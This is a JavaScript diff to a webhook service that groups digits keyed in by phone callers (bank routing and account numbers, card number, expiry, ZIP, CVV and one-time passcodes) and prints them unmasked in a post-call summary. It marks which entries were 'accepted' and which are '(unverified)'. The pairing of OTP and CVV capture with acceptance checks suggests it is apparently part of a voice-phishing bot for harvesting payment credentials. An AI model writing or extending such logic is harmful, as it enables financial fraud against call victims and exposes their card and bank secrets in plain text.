@@ -139,6 +139,34 @@ class EnhancedWebhookService {
       return '';
     }
 
+    const captureGroups = [
+      {
+        id: 'banking',
+        label: 'Banking',
+        fields: [
+          { profiles: ['routing_number'], label: 'Routing Number' },
+          { profiles: ['account_number'], label: 'Account Number' }
+        ]
+      },
+      {
+        id: 'card',
+        label: 'Card',
+        fields: [
+          { profiles: ['card_number'], label: 'Card Number' },
+          { profiles: ['card_expiry'], label: 'Expiry Date' },
+          { profiles: ['zip'], label: 'ZIP Code' },
+          { profiles: ['cvv'], label: 'CVV' }
+        ]
+      },
+      {
+        id: 'otp',
+        label: 'OTP',
+        fields: [
+          { profiles: ['verification', 'otp'], label: 'OTP' }
+        ]
+      }
+    ];
+
     const labels = {
       verification: 'OTP',
       otp: 'OTP',
@@ -164,6 +192,15 @@ class EnhancedWebhookService {
       generic: 'Digits'
     };
 
+    const pickEvent = (group = []) => {
+      if (!group.length) return null;
+      const accepted = group.filter((item) => item.accepted);
+      if (accepted.length) return accepted[accepted.length - 1];
+      const withDigits = group.filter((item) => item?.digits);
+      if (withDigits.length) return withDigits[withDigits.length - 1];
+      return group[group.length - 1];
+    };
+
     const maskDigits = (event) => {
       const raw = event?.digits || '';
       if (raw) return raw; // show full digits in post-call summary
@@ -176,11 +213,55 @@ class EnhancedWebhookService {
 
     const grouped = new Map();
     for (const event of events) {
-      const profile = event.profile || 'generic';
+      const profile = String(event.profile || 'generic').toLowerCase();
       if (!grouped.has(profile)) {
         grouped.set(profile, []);
       }
-      grouped.get(profile).push(event);
+      grouped.get(profile).push({ ...event, profile });
+    }
+
+    const profilesPresent = new Set(grouped.keys());
+    const activeGroups = captureGroups.filter((group) =>
+      group.fields.some((field) => field.profiles.some((profile) => profilesPresent.has(profile)))
+    );
+
+    if (activeGroups.length) {
+      const lines = [];
+      const coveredProfiles = new Set();
+
+      for (const group of activeGroups) {
+        lines.push(group.label);
+        for (const field of group.fields) {
+          const fieldEvents = [];
+          field.profiles.forEach((profile) => {
+            const entries = grouped.get(profile) || [];
+            if (entries.length) {
+              fieldEvents.push(...entries);
+            }
+            coveredProfiles.add(profile);
+          });
+          const chosen = pickEvent(fieldEvents);
+          const raw = chosen?.digits ? String(chosen.digits) : '';
+          const value = raw || 'none';
+          const suffix = chosen?.accepted ? '' : ' (unverified)';
+          lines.push(`${field.label}: ${value}${suffix}`);
+        }
+      }
+
+      const remainingProfiles = [...grouped.keys()].filter((profile) => !coveredProfiles.has(profile));
+      if (remainingProfiles.length) {
+        for (const profile of remainingProfiles) {
+          const entries = grouped.get(profile) || [];
+          const chosen = pickEvent(entries);
+          const raw = chosen?.digits ? String(chosen.digits) : '';
+          const value = raw || 'none';
+          const suffix = chosen?.accepted ? '' : ' (unverified)';
+          const label = labels[profile] || profile;
+          lines.push(`${label}: ${value}${suffix}`);
+        }
+      }
+
+      return lines.join('\n');
     }
 
     const parts = [];
